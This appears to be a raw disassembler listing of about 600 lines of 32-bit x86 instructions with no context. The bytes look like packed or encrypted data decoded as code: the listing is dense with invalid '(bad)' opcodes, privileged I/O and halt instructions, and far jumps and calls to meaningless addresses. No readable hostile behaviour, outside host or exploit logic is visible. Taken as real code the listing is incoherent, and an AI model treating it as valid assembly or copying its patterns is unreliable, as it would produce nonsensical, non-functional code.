  418432:	xchg   edi,eax
  418433:	xor    BYTE PTR [eax],0x5e
  418436:	adc    al,0x3f
  418438:	jge    0x418418
  41843a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41843b:	pop    ss
  41843c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41843d:	and    al,0x87
  41843f:	xchg   DWORD PTR [edx],eax
  418441:	aas    
  418442:	ret    
  418443:	(bad)  [eax+0x1]
  418447:	sub    DWORD PTR [ebx+0x79457a85],ecx
  41844d:	inc    eax
  41844e:	lahf   
  41844f:	cmp    BYTE PTR [ebx+0x1f],ch
  418452:	xchg   edx,eax
  418453:	aad    0x58
  418455:	pop    ebp
  418456:	xchg   edi,eax
  418457:	(bad)
  41845a:	stos   BYTE PTR es:[edi],al
  41845b:	in     al,dx
  41845c:	stos   DWORD PTR es:[edi],eax
  41845d:	dec    edx
  41845e:	enter  0xf0e5,0xe4
  418462:	pop    ecx
  418463:	xchg   DWORD PTR [ebx+0x67],ebx
  418466:	or     eax,0x9fe1dd3b
  41846b:	xlat   BYTE PTR ds:[ebx]
  41846c:	js     0x4184d2
  41846e:	mov    fs,WORD PTR [ecx-0x7bdc4079]
  418474:	push   edx
  418475:	stos   DWORD PTR es:[edi],eax
  418476:	jo     0x41840d
  418478:	std    
  418479:	sti    
  41847a:	je     0x4184b9
  41847c:	repz (bad) 
  41847e:	shr    esp,cl
  418480:	fld    st(0)
  418482:	out    dx,al
  418483:	or     eax,0x53ce7fd4
  418488:	pop    ecx
  418489:	jl     0x418411
  41848b:	dec    esi
  41848c:	cld    
  41848d:	or     eax,0x6e58e556
  418492:	jbe    0x4184db
  418494:	ret    0x97f8
  418497:	and    ecx,DWORD PTR [edi+0x6ff8303f]
  41849d:	mov    esi,DWORD PTR [esi]
  41849f:	sbb    BYTE PTR [eax+0x5dc3547b],dl
  4184a5:	out    dx,eax
  4184a6:	mov    al,ds:0xce052b36
  4184ab:	pop    ds
  4184ac:	aad    0x3c
  4184ae:	aad    0xb9
  4184b0:	push   ebx
  4184b1:	shl    bh,0xc9
  4184b4:	push   cs
  4184b5:	xchg   edi,eax
  4184b6:	pop    eax
  4184b7:	sub    eax,0x72d13ff0
  4184bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184bd:	test   ebx,edx
  4184bf:	sbb    ecx,DWORD PTR [ebx+0x63]
  4184c2:	xchg   edi,eax
  4184c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c4:	xchg   edi,eax
  4184c5:	pop    ecx
  4184c6:	loop   0x418495
  4184c8:	jbe    0x418520
  4184ca:	or     al,0xd0
  4184cc:	push   eax
  4184cd:	fsubr  QWORD PTR [edi]
  4184cf:	xchg   DWORD PTR [ebx],esp
  4184d1:	lock jecxz 0x41848c
  4184d4:	in     al,0xca
  4184d6:	(bad)  
  4184d8:	sub    al,0xd5
  4184da:	mov    DWORD PTR [ebp+eiz*8-0x1c],0xf2266e6b
  4184e2:	push   cs
  4184e3:	xchg   DWORD PTR [esi],esi
  4184e5:	iret   
  4184e6:	push   esp
  4184e7:	mov    al,0xc7
  4184e9:	stc    
  4184ea:	aam    0x7e
  4184ec:	rol    al,cl
  4184ee:	test   al,0x40
  4184f0:	push   ecx
  4184f1:	mov    ds:0x4194e0c5,eax
  4184f6:	pusha  
  4184f7:	sub    eax,0x93d88061
  4184fc:	pushf  
  4184fd:	rcr    BYTE PTR [ecx+0x277282c9],0x70
  418504:	es inc eax
  418506:	(bad)  
  418507:	adc    eax,0xbcd6260e
  41850c:	push   edx
  41850d:	(bad)  
  41850e:	jg     0x41851d
  418510:	dec    edi
  418511:	inc    edi
  418512:	xchg   edi,eax
  418513:	cmp    al,0x80
  418515:	jl     0x41849c
  418517:	(bad)  
  418519:	jo     0x41853c
  41851b:	fisub  DWORD PTR [esi-0x3]
  41851e:	ins    DWORD PTR es:[edi],dx
  41851f:	xchg   DWORD PTR [ebp-0x6a4e00c8],ebx
  418525:	retf   
  418526:	mov    bl,0x3e
  418528:	add    al,0x9a
  41852a:	pushf  
  41852b:	mov    ds:0x5317b55d,eax
  418530:	inc    ebx
  418531:	xchg   ecx,eax
  418532:	xor    eax,0xf59f2fc2
  418537:	xchg   BYTE PTR [eax+ebp*2],dl
  41853a:	dec    ebx
  41853b:	or     eax,0x29d73bfc
  418540:	loopne 0x41855a
  418542:	dec    ebx
  418543:	jns    0x4184cc
  418545:	rcl    BYTE PTR [ecx-0x49],0x85
  418549:	inc    ecx
  41854a:	fwait
  41854b:	test   BYTE PTR [eax],bh
  41854d:	mov    al,0xbe
  41854f:	sub    BYTE PTR [ebp-0x22256c60],cl
  418555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418556:	fimul  WORD PTR [ebp-0x17]
  418559:	xchg   esi,eax
  41855a:	fcom   DWORD PTR [ecx-0x2a]
  41855d:	inc    eax
  41855e:	jmp    0x121a7520
  418563:	shl    BYTE PTR [ebx+0x0],1
  418566:	mov    ch,0x94
  418568:	mov    dl,0xa9
  41856a:	fidiv  DWORD PTR [eax+0x949fd5d]
  418570:	stos   BYTE PTR es:[edi],al
  418571:	imul   esp,DWORD PTR [esi+0x47],0xffffff92
  418575:	dec    ebx
  418576:	pop    ecx
  418577:	xchg   esi,eax
  418579:	test   BYTE PTR [edi],al
  41857b:	cmp    dl,0xf3
  41857e:	mov    eax,0x71eb5ff9
  418583:	aam    0x1b
  418585:	rcr    BYTE PTR [edx],0x1
  418588:	test   al,0x53
  41858a:	fwait
  41858b:	push   ebx
  41858c:	pop    ebx
  41858d:	jl     0x4185f6
  41858f:	xchg   DWORD PTR [ebp+0x5817358b],esp
  418595:	jnp    0x41852e
  418597:	jmp    0xf63b:0x3c3cc35a
  41859e:	add    DWORD PTR [esi-0x791f7b37],eax
  4185a4:	repnz retf 0xfe34
  4185a8:	fnsave [eax]
  4185aa:	les    esp,FWORD PTR [ebx+0x33]
  4185ad:	ss inc esi
  4185af:	adc    BYTE PTR [ebp-0x5a092bc0],al
  4185b5:	add    al,0x28
  4185b7:	xor    dh,BYTE PTR [ebx-0x3d]
  4185ba:	xchg   edi,eax
  4185bb:	or     BYTE PTR [ecx],0xb2
  4185be:	pop    edx
  4185bf:	icebp  
  4185c0:	dec    ecx
  4185c1:	jb     0x41858b
  4185c3:	stos   DWORD PTR es:[edi],eax
  4185c4:	scas   al,BYTE PTR es:[edi]
  4185c5:	cmp    eax,0xfbbd86b9
  4185ca:	stos   DWORD PTR es:[edi],eax
  4185cb:	mov    dh,bl
  4185cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ce:	and    dh,dl
  4185d0:	mov    eax,ds:0x5deff8cc
  4185d5:	jbe    0x41860a
  4185d7:	nop
  4185d8:	inc    edi
  4185d9:	es dec edi
  4185db:	dec    esi
  4185dc:	in     al,0x51
  4185de:	sub    al,0x1d
  4185e0:	ja     0x418637
  4185e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185e3:	in     al,0x0
  4185e5:	cmp    BYTE PTR [edx+eiz*4+0x5c],ah
  4185e9:	lea    edi,[edx-0x79]
  4185ec:	dec    esi
  4185ed:	jb     0x41857f
  4185ef:	rcr    ebp,1
  4185f1:	sub    DWORD PTR [esi-0xe],esi
  4185f4:	outs   dx,DWORD PTR ds:[esi]
  4185f5:	jnp    0x4185a2
  4185f7:	and    DWORD PTR [ebx+eax*2],0x206ddaec
  4185fe:	fist   DWORD PTR [eax-0x55d44473]
  418604:	fst    QWORD PTR [ebx]
  418606:	pop    esi
  418607:	and    ebx,eax
  418609:	cmp    DWORD PTR [eax+0x353fff50],0x2eb7538d
  418613:	outs   dx,BYTE PTR ds:[esi]
  418614:	xor    dl,BYTE PTR [eax+0x1bbffe97]
  41861a:	pushf  
  41861b:	xor    eax,0x3e8f8707
  418620:	jmp    0x31bd:0xc287907f
  418627:	sub    ebx,ebp
  418629:	into   
  41862a:	mov    WORD PTR [edi],?
  41862c:	out    0x71,eax
  41862e:	push   esp
  41862f:	enter  0x5d20,0xcd
  418633:	xor    eax,ebx
  418635:	add    BYTE PTR [eax],bl
  418637:	mov    ch,0x8e
  418639:	lock mov bh,BYTE PTR [esi-0x23]
  41863d:	jbe    0x4186b6
  41863f:	pop    edi
  418640:	in     al,dx
  418641:	sbb    ebp,esi
  418643:	scas   al,BYTE PTR es:[edi]
  418644:	cmp    eax,DWORD PTR [ebx+0x3e]
  418647:	adc    DWORD PTR [ecx],eax
  418649:	inc    edi
  41864b:	inc    ecx
  41864c:	mov    ebp,0xcb5a1683
  418651:	(bad)  
  418652:	xchg   edi,eax
  418653:	mov    eax,0xa8b1e3a3
  418658:	fisub  WORD PTR [edx-0x323a5b1c]
  41865e:	push   ecx
  41865f:	xchg   DWORD PTR [edi+esi*8-0x51],edx
  418663:	or     ebp,ebx
  418665:	mov    al,ds:0x3a99dabd
  41866a:	mov    ds:0x4043bebc,al
  41866f:	dec    edx
  418670:	sti    
  418671:	cmp    BYTE PTR [esi-0x72],cl
  418674:	ins    DWORD PTR es:[edi],dx
  418675:	hlt    
  418676:	xor    al,0x9c
  418678:	cmp    DWORD PTR [eax+0x76e90a56],ebp
  41867e:	ins    BYTE PTR es:[edi],dx
  41867f:	mov    WORD PTR [eax+0x28],fs
  418682:	or     DWORD PTR [edi],edi
  418684:	int3   
  418685:	inc    edi
  418686:	stc    
  418687:	push   ss
  418688:	xchg   DWORD PTR [esi+0x2e],ebx
  41868b:	xchg   DWORD PTR [edi+0x63],esi
  41868e:	sub    al,0xdb
  418690:	(bad)  [edi]
  418692:	shl    BYTE PTR [edi+0x33],1
  418695:	xchg   DWORD PTR [ebp+0xd],ecx
  418698:	in     al,0x3f
  41869a:	pop    eax
  41869b:	cmp    al,0x67
  41869d:	mov    edx,0x34461659
  4186a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186a3:	sub    esp,ebp
  4186a5:	push   es
  4186a6:	mov    edx,0xd896bb6b
  4186ab:	in     al,0xd4
  4186ad:	mov    ecx,0xe3b94199
  4186b2:	push   es
  4186b3:	fcomp  QWORD PTR gs:[ebp+edx*4+0x3e4fc18e]
  4186bb:	add    al,0x19
  4186bd:	mov    al,ds:0x4c79fea6
  4186c2:	xchg   edi,eax
  4186c3:	xchg   ecx,eax
  4186c4:	add    BYTE PTR [ebp+0x72],dl
  4186c7:	je     0x4186f9
  4186c9:	add    DWORD PTR [ebx+0x11],0xffffffdf
  4186cd:	pop    ebx
  4186ce:	(bad)  
  4186d1:	inc    eax
  4186d2:	popa   
  4186d3:	jmp    0x4186d6
  4186d5:	jmp    0xfffe:0x81dd4998
  4186dc:	loopne 0x4186bd
  4186de:	fwait
  4186df:	repnz into 
  4186e1:	inc    ecx
  4186e2:	(bad)  [ebp+0x1db0b4b8]
  4186e8:	pusha  
  4186e9:	sbb    BYTE PTR [eax+ebx*2-0x23],ch
  4186ed:	shl    DWORD PTR [eax+0x256439de],1
  4186f3:	je     0x4186f2
  4186f5:	aas    
  4186f6:	(bad)  
  4186f7:	xchg   esi,eax
  4186f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186f9:	aas    
  4186fa:	aam    0x82
  4186fc:	scas   al,BYTE PTR es:[edi]
  4186fd:	push   ebx
  4186fe:	xchg   edi,eax
  4186ff:	pop    esp
  418700:	push   ebp
  418701:	jle    0x4186bb
  418703:	pushf  
  418704:	inc    ecx
  418705:	or     DWORD PTR [eax-0xa6f31de],edi
  41870b:	mov    DWORD PTR [eax-0x5b],eax
  41870e:	xchg   DWORD PTR [esi+eiz*8+0x2b],ebp
  418712:	cwde   
  418713:	mov    BYTE PTR [esi],cl
  418715:	mov    bl,0x8
  418717:	test   BYTE PTR [ebp-0x3925664],ah
  41871d:	inc    edx
  41871e:	lahf   
  41871f:	(bad)  
  418720:	xchg   edx,eax
  418721:	and    bh,cl
  418723:	pop    edi
  418724:	aad    0xe1
  418726:	mov    cl,0xc4
  418728:	fnsave [ecx]
  41872a:	fst    QWORD PTR [esi+0xd]
  41872d:	mov    esp,ecx
  41872f:	jmp    0x1db2:0xb2ff406f
  418736:	fwait
  418737:	mov    edi,0xf7e3edff
  41873c:	lods   al,BYTE PTR ds:[esi]
  41873d:	inc    eax
  41873e:	lods   al,BYTE PTR ds:[esi]
  41873f:	sub    eax,0xbada440
  418744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418745:	inc    eax
  418746:	repnz cmp DWORD PTR [ecx],0x5ec761ae
  41874d:	retf   
  41874e:	xchg   edi,eax
  41874f:	adc    ah,cl
  418751:	push   esp
  418752:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418754:	test   DWORD PTR [esi+0x62791050],0x7dea86ae
  41875e:	fsubr  QWORD PTR [esi]
  418760:	fucom  st(4)
  418762:	push   ebp
  418763:	pop    esp
  418764:	xchg   ebp,eax
  418765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418766:	mov    BYTE PTR ds:0xb12044af,cl
  41876c:	and    ch,dl
  41876e:	inc    eax
  41876f:	sub    ah,al
  418771:	aam    0xac
  418773:	push   es
  418774:	(bad)  
  418776:	mov    esi,0x6fcb3207
  41877b:	push   ds
  41877c:	scas   eax,DWORD PTR es:[edi]
  41877d:	inc    eax
  41877e:	fst    QWORD PTR [eax+0xe]
  418781:	ins    BYTE PTR es:[edi],dx
  418782:	mov    dl,0xe4
  418784:	jl     0x418745
  418786:	rcr    DWORD PTR [ebx],cl
  418788:	xchg   esi,eax
  418789:	inc    ecx
  41878a:	pusha  
  41878b:	out    0xf5,eax
  41878d:	and    al,0xbc
  41878f:	fadd   st(5),st
  418791:	inc    esp
  418792:	stos   BYTE PTR es:[edi],al
  418793:	std    
  418794:	add    eax,DWORD PTR [edi-0x7]
  418797:	jo     0x4187ef
  418799:	inc    esi
  41879a:	mov    eax,0xc2037458
  41879f:	out    0xeb,al
  4187a1:	sub    ebp,DWORD PTR [esi-0x72be8187]
  4187a7:	ret    0xb0a9
  4187aa:	jae    0x41876f
  4187ac:	stos   BYTE PTR es:[edi],al
  4187ad:	inc    ecx
  4187ae:	sbb    DWORD PTR [edi-0xa],esi
  4187b1:	mov    DWORD PTR [eax+0xd],ebp
  4187b4:	shl    DWORD PTR [eax+0xa5ad353],0x98
  4187bb:	dec    edi
  4187bc:	cmp    ebp,esp
  4187be:	aam    0x2
  4187c0:	pop    esp
  4187c1:	xchg   ah,ah
  4187c3:	and    DWORD PTR [edi+edx*8],ecx
  4187c6:	push   0xffffff87
  4187c8:	xchg   esi,eax
  4187c9:	jnp    0x41883b
  4187cb:	cld    
  4187cc:	fisttp QWORD PTR [ebx+0x4b1f1328]
  4187d2:	push   es
  4187d3:	or     BYTE PTR [esi+0x40],dl
  4187d6:	pusha  
  4187d7:	ss aaa 
  4187d9:	sti    
  4187da:	or     ch,0x71
  4187dd:	in     al,0x97
  4187df:	cwde   
  4187e0:	inc    eax
  4187e1:	(bad)  
  4187e2:	in     eax,0xe7
  4187e4:	sti    
  4187e5:	xchg   ecx,eax
  4187e6:	ret    0x55cb
  4187e9:	cdq    
  4187ea:	popa   
  4187eb:	xchg   DWORD PTR [ecx+0x3e],esp
  4187ee:	fimul  WORD PTR [ebp-0x2a45ab23]
  4187f4:	mov    edi,ebp
  4187f6:	fidivr DWORD PTR [ebp-0x5b]
  4187f9:	inc    ebx
  4187fa:	ins    BYTE PTR es:[edi],dx
  4187fb:	mov    DWORD PTR [ecx],edi
  4187fd:	xchg   ecx,eax
  4187fe:	xor    al,0x22
  418800:	jne    0x418796
  418802:	stos   DWORD PTR es:[edi],eax
  418803:	(bad)  
  418805:	lods   eax,DWORD PTR ds:[esi]
  418806:	test   al,0xb4
  418808:	cld    
  418809:	cmp    bl,BYTE PTR [eax]
  41880b:	mov    esp,0xec8f96b9
  418810:	add    BYTE PTR [ecx],bh
  418812:	fiadd  WORD PTR [esi-0x73fe2e5d]
  418818:	jmp    0x41887f
  41881a:	mov    al,0x4f
  41881c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41881d:	shr    BYTE PTR [edx+0x72],0x5b
  418821:	jge    0x418867
  418823:	test   eax,0x6f0542e7
  418828:	mov    ecx,0x6de64ecf
  41882d:	mov    ebp,0xc5c1c49a
  418832:	xchg   edi,eax
  418833:	mov    esi,0xc3ccb9ba
  418838:	lds    edi,FWORD PTR [ecx]
  41883a:	mov    ebx,0xa9549f8f
  41883f:	xchg   BYTE PTR ds:0xdd3182c8,ah
  418845:	inc    edx
  418846:	mov    dh,0x9b
  418848:	dec    ebx
  418849:	js     0x41888f
  41884b:	cmp    ah,al
  41884d:	inc    eax
  41884e:	mov    bl,0xe4
  418850:	test   edi,eax
  418852:	rcl    DWORD PTR [ecx+0xab52459],cl
  418858:	or     DWORD PTR [eax],ecx
  41885a:	pop    ecx
  41885b:	mov    esi,DWORD PTR [ebx+eiz*4-0xf]
  41885f:	fidivr DWORD PTR [ebp-0x13caf272]
  418865:	add    esi,DWORD PTR [ebp+0x3d396586]
  41886b:	pop    edx
  41886c:	fst    QWORD PTR [esi]
  41886e:	call   0x1684:0x30079a0c
  418875:	dec    ebx
  418876:	sub    ecx,ebp
  418878:	push   ebp
  418879:	adc    BYTE PTR [edi-0x729bd2c8],0x6e
  418880:	fnstcw WORD PTR [ecx]
  418882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418883:	leave  
  418884:	jb     0x418848
  418886:	mov    ebp,esi
  418888:	ins    BYTE PTR es:[edi],dx
  418889:	or     ebp,esi
  41888b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41888c:	inc    ebx
  41888d:	inc    eax
  41888e:	xchg   esi,eax
  41888f:	outs   dx,DWORD PTR ds:[esi]
  418890:	jae    0x4188f6
  418892:	loope  0x418904
  418894:	into   
  418895:	(bad)  
  418896:	xchg   edi,eax
  418897:	sub    al,0x34
  418899:	sbb    al,0x53
  41889b:	or     bh,BYTE PTR [edx]
  41889d:	dec    ebx
  41889e:	shr    ebx,1
  4188a0:	mov    dl,0x76
  4188a2:	mov    esi,0x50264689
  4188a7:	sar    ebx,cl
  4188a9:	sets   BYTE PTR [ebp+eax*2-0x69]
  4188ae:	cwde   
  4188af:	mov    eax,ds:0xca84f549
  4188b4:	dec    esp
  4188b5:	ins    DWORD PTR es:[edi],dx
  4188b6:	xchg   esi,eax
  4188b7:	mov    bh,BYTE PTR [edi+0x38]
  4188ba:	cwde   
  4188bb:	inc    ecx
  4188bc:	jmp    0x6e7c5054
  4188c1:	xor    DWORD PTR [ecx-0x1c],eax
  4188c4:	clc    
  4188c5:	sbb    BYTE PTR [edx-0x21027f7a],dh
  4188cb:	push   edi
  4188cc:	in     al,0xe
  4188ce:	out    dx,eax
  4188cf:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4188d1:	sti    
  4188d2:	out    0x91,eax
  4188d4:	mov    ds:0xd56122ad,eax
  4188d9:	nop
  4188da:	sub    al,0x87
  4188dc:	mov    ds:0xe49ee5a5,al
  4188e1:	shr    DWORD PTR [edx+0x2ef6e901],0x42
  4188e8:	(bad)  
  4188e9:	fistp  QWORD PTR [edx]
  4188eb:	fstp   DWORD PTR [ecx+0x32]
  4188ee:	gs xor ecx,ebx
  4188f1:	(bad)
  4188f5:	mov    WORD PTR [ecx-0xb],?
  4188f8:	in     al,0xdd
  4188fa:	retf   
  4188fb:	mov    al,0x3f
  4188fd:	ficom  DWORD PTR [edi+0x640e0e90]
  418903:	(bad)  
  418904:	jae    0x4188fb
  418906:	and    eax,DWORD PTR [edi+0x7a9e0fe9]
  41890c:	jmp    0x4188b4
  41890e:	hlt    
  41890f:	jae    0x4188d6
  418911:	shl    cl,0xf9
  418914:	sbb    eax,0x79ae2e4e
  418919:	add    al,0xaa
  41891b:	outs   dx,BYTE PTR es:[esi]
  41891d:	add    eax,0x78a886a3
  418922:	test   DWORD PTR [esi+0x550591b],edi
  418928:	aas    
  418929:	or     BYTE PTR [esi+0x17f6a387],cl
  41892f:	in     eax,dx
  418930:	das    
  418931:	sbb    DWORD PTR [ebp-0x53],ebx
  418934:	xor    eax,edx
  418936:	add    BYTE PTR [edi+0x3997eaa0],al
  41893c:	outs   dx,DWORD PTR ds:[esi]
  41893d:	dec    eax
  41893e:	dec    edi
  41893f:	es pop es
  418941:	les    edi,FWORD PTR [edi]
  418943:	jecxz  0x4189b6
  418945:	cmp    BYTE PTR [ebx],0x87
  418948:	mov    ah,0x23
  41894a:	pop    ebx
  41894b:	icebp  
  41894c:	fisttp QWORD PTR [ebp-0x7e]
  41894f:	stc    
  418950:	jns    0x41891f
  418952:	mov    eax,0x8a5e8c28
  418957:	adc    eax,DWORD PTR [eax+eax*4]
  41895a:	xchg   ebp,eax
  41895b:	cli    
  41895c:	bound  ebx,QWORD PTR [edi-0x24]
  41895f:	sbb    ebp,0xe7186de4
  418965:	xor    al,0x4e
  418967:	mov    BYTE PTR ds:0xc754ac40,cl
  41896d:	jb     0x4189e3
  41896f:	pop    esi
  418970:	mov    eax,0xdd03954b
  418975:	lahf   
  418976:	enter  0x8911,0x89
  41897a:	jmp    DWORD PTR [ebx]
  41897c:	fwait
  41897d:	pop    ebp
  41897e:	dec    esi
  41897f:	es mov ah,0x9c
  418982:	adc    edx,esi
  418984:	jb     0x418980
  418986:	nop
  418987:	xchg   DWORD PTR [ecx-0x45],edx
  41898a:	xchg   ecx,eax
  41898b:	mov    bl,0xdd
  41898d:	sub    al,0x62
  41898f:	(bad)  [eax]
  418991:	out    dx,al
  418992:	adc    bl,dl
  418994:	cld    
  418995:	aaa    
  418996:	jmp    0xe6032eb1
  41899b:	xchg   BYTE PTR [edi],cl
  41899d:	mov    eax,0x46e85e55
  4189a2:	sub    ch,BYTE PTR [eax-0x3c]
  4189a5:	inc    eax
  4189a6:	mul    BYTE PTR [esi+0x61]
  4189a9:	mov    eax,ds:0xb5348126
  4189ae:	dec    esp
  4189af:	mov    bl,0xa9
  4189b1:	stos   DWORD PTR es:[edi],eax
  4189b2:	xchg   DWORD PTR ss:[ecx],ecx
  4189b5:	repnz xchg edi,eax
  4189b7:	sub    ebp,DWORD PTR [ebx-0x2a]
  4189ba:	outs   dx,DWORD PTR ds:[esi]
  4189bb:	mov    bh,0xf2
  4189bd:	sahf   
  4189be:	mov    ebx,DWORD PTR [edi]
  4189c0:	std    
  4189c1:	adc    BYTE PTR [edx+0xa743986],bl
  4189c7:	dec    ebx
  4189c8:	fnsave [eax]
  4189ca:	xor    cl,BYTE PTR [edi+0x40b865dc]
  4189d0:	mov    al,ds:0xbb17ad41
  4189d5:	ds loop 0x418a24
  4189d8:	inc    ebp
  4189d9:	shr    BYTE PTR [edi],0x8d
  4189dc:	fsubr  DWORD PTR [edi+0x3ff467b7]
  4189e2:	pop    ecx
  4189e3:	test   al,0xa5
  4189e5:	xchg   BYTE PTR [edi+0x11],dl
  4189e8:	frstpm(287 only) 
  4189ea:	shl    DWORD PTR [edx],1
  4189ec:	rol    al,0x77
  4189ef:	xor    ebx,DWORD PTR ds:0xa7f799cf
  4189f5:	inc    eax
  4189f6:	jb     0x418a3e
  4189f8:	or     BYTE PTR [edi+eax*1],bh
  4189fb:	(bad)  
  4189fc:	adc    eax,0xcf74976c
  418a01:	pop    edi
  418a02:	dec    ecx
  418a03:	mov    ds:0x9fc964fb,eax
  418a08:	xor    bl,BYTE PTR [ebp-0x76]
  418a0b:	xchg   DWORD PTR [ecx],esp
  418a0d:	fistp  WORD PTR [ebx-0x2b7eea70]
  418a13:	lea    edx,[ebx-0x2271aafa]
  418a19:	pop    edi
  418a1a:	scas   eax,DWORD PTR es:[edi]
  418a1b:	mov    esp,0x6947408b
  418a20:	push   eax
  418a21:	fcmovnbe st,st(0)
  418a23:	loop   0x418a29
  418a25:	add    eax,0x99546298
  418a2a:	das    
  418a2b:	inc    ecx
  418a2c:	mov    edx,0x567641ce
  418a31:	es add al,0x87
  418a34:	adc    BYTE PTR es:[eax+edx*2+0x631447dd],dl
  418a3c:	test   BYTE PTR [edx],bl
  418a3e:	pop    ebx
  418a3f:	sbb    esp,DWORD PTR [eax+0x43]
  418a42:	mov    bl,0xdf
  418a44:	adc    esi,DWORD PTR [esi-0x5c5a33b7]
  418a4a:	mov    bl,BYTE PTR ds:0xe1a2d3dd
  418a50:	out    0xf9,eax
  418a52:	sbb    BYTE PTR [esi+esi*2-0x65e1ffc0],ah
  418a59:	pushf  
  418a5a:	xor    BYTE PTR [eax-0x16],0x1c
  418a5e:	cwde   
  418a5f:	jmp    0xb06a45c9
  418a64:	and    eax,0xacd17194
  418a69:	push   esi
  418a6a:	dec    ecx
  418a6b:	xchg   DWORD PTR ds:0xdd3cd737,eax
  418a71:	dec    edi
  418a72:	ja     0x418aa0
  418a74:	leave  
  418a75:	and    DWORD PTR [ecx+0x275cfc74],ecx
  418a7b:	aas    
  418a7c:	imul   eax,DWORD PTR [eax-0xb],0xffffffa6
  418a80:	jp     0x418a75
  418a82:	sub    al,0x4a
  418a84:	leave  
  418a85:	fs fwait
  418a87:	scas   al,BYTE PTR es:[edi]
  418a88:	scas   al,BYTE PTR es:[edi]
  418a89:	sub    DWORD PTR [esi-0x49],edx
  418a8c:	pop    ebp
  418a8d:	out    0x59,eax
  418a8f:	push   ebp
  418a90:	retf   
  418a91:	inc    ecx
  418a92:	imul   ecx,DWORD PTR [ebp+0x19985002],0xffffffc4
  418a99:	xor    BYTE PTR [eax-0x4],cl
  418a9c:	(bad)  
  418a9e:	push   ss
  418a9f:	push   0x1f
  418aa1:	push   edi
  418aa2:	loopne 0x418b1a
  418aa4:	ins    DWORD PTR es:[edi],dx
  418aa5:	inc    eax
  418aa6:	xor    dh,BYTE PTR [eax-0x28895d75]
  418aac:	jmp    FWORD PTR [ecx-0x33e883f4]
  418ab2:	xchg   ecx,eax
  418ab3:	stos   BYTE PTR es:[edi],al
  418ab4:	xchg   edi,eax
  418ab5:	lods   al,BYTE PTR ds:[esi]
  418ab6:	add    DWORD PTR [edi],0xd4a9f1a5
  418abc:	jae    0x418a83
  418abe:	add    BYTE PTR [esi+0x1261c005],cl
  418ac4:	daa    
  418ac5:	clc    
  418ac6:	xchg   edi,eax
  418ac7:	mov    ecx,edx
  418ac9:	xchg   ebp,eax
  418aca:	xchg   ebp,eax
  418acb:	int3   
  418acc:	fs pop edx
  418ace:	sub    esp,0x60
  418ad1:	xchg   DWORD PTR [ebp-0x736dbc79],ecx
  418ad7:	adc    ch,bl
  418ad9:	cmp    DWORD PTR [eax],edi
  418adb:	ja     0x418af0
  418add:	and    DWORD PTR [ebx],ecx
  418adf:	adc    eax,0x90d7bd73
  418ae4:	push   es
  418ae5:	jae    0x418b22
  418ae7:	les    ebx,FWORD PTR [ecx+0x41]
  418aea:	not    al
  418aec:	ds add eax,0x5dd4f4da
  418af2:	xchg   edi,eax
  418af3:	cmp    BYTE PTR [edx],0x32
  418af6:	cld    
  418af7:	leave  
  418af8:	leave  
  418af9:	push   cs
  418afa:	xor    eax,0xca03801e
  418aff:	xchg   dl,ah
  418b01:	ficomp DWORD PTR [esi+0x37]
  418b04:	jmp    0x418b2a
  418b06:	retf   
  418b07:	sbb    al,0x6
  418b09:	and    BYTE PTR [edi],0xa4
  418b0c:	xchg   DWORD PTR [edx],edx
  418b0e:	inc    ebp
  418b0f:	inc    ebp
  418b10:	aam    0x36
  418b12:	ret    0x986
  418b15:	neg    bl
  418b17:	mov    edi,0xb28ff1dd
  418b1c:	mov    ecx,0x2fcbd350
  418b21:	inc    eax
  418b22:	xchg   BYTE PTR [edx],bl
  418b24:	aas    
  418b25:	int    0xf2
  418b27:	inc    esp
  418b28:	inc    edi
  418b29:	cmp    dl,al
  418b2b:	cmp    DWORD PTR [ecx],eax
  418b2d:	rcl    DWORD PTR [ebx],0x25
  418b30:	pushf  
  418b31:	aam    0xb3
  418b33:	retf   0x57d1
  418b36:	outs   dx,DWORD PTR ds:[esi]
  418b37:	fidivr WORD PTR [ebx+edx*2-0x3c]
  418b3b:	xchg   BYTE PTR [esi-0xfb579cc],al
  418b41:	sub    BYTE PTR [ecx+0x12],dh
  418b44:	ffree  st(0)
  418b46:	ins    DWORD PTR es:[edi],dx
  418b47:	ja     0x418b66
  418b49:	scas   al,BYTE PTR es:[edi]
  418b4a:	das    
  418b4b:	cmp    al,0x13
  418b4d:	daa    
  418b4e:	cwde   
  418b4f:	jecxz  0x418bae
  418b51:	dec    esi
  418b52:	mov    DWORD PTR [ecx-0x72],0xdd0f0cb3
  418b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5a:	mov    bh,0x52
  418b5c:	call   0xb6b6:0xdbd1986d
  418b63:	mov    al,ds:0x86a3da38
  418b68:	scas   eax,DWORD PTR es:[edi]
  418b69:	outs   dx,BYTE PTR ds:[esi]
  418b6a:	sahf   
  418b6b:	popa   
  418b6c:	fstp   st(5)
  418b6e:	add    eax,0x8f6617fc
  418b73:	xchg   ebp,eax
  418b74:	cdq    
  418b75:	inc    eax
  418b76:	pop    ebx
  418b77:	ja     0x418b8b
  418b79:	mov    ah,0x8
  418b7b:	int    0x1a
  418b7d:	jecxz  0x418b16
  418b7f:	add    BYTE PTR [ecx-0x78],bl
  418b82:	jecxz  0x418b19
  418b84:	fisub  WORD PTR [ebx-0x63f3de12]
  418b8a:	imul   ecx,DWORD PTR [esi+0x544fb027],0x48977707
  418b94:	mov    bl,BYTE PTR [ebx-0x1bcab09e]
  418b9a:	adc    esi,DWORD PTR [esi+ebp*8+0x3e877dc5]
  418ba1:	jmp    0x8624:0x4add7ea5
  418ba8:	in     eax,0x6e
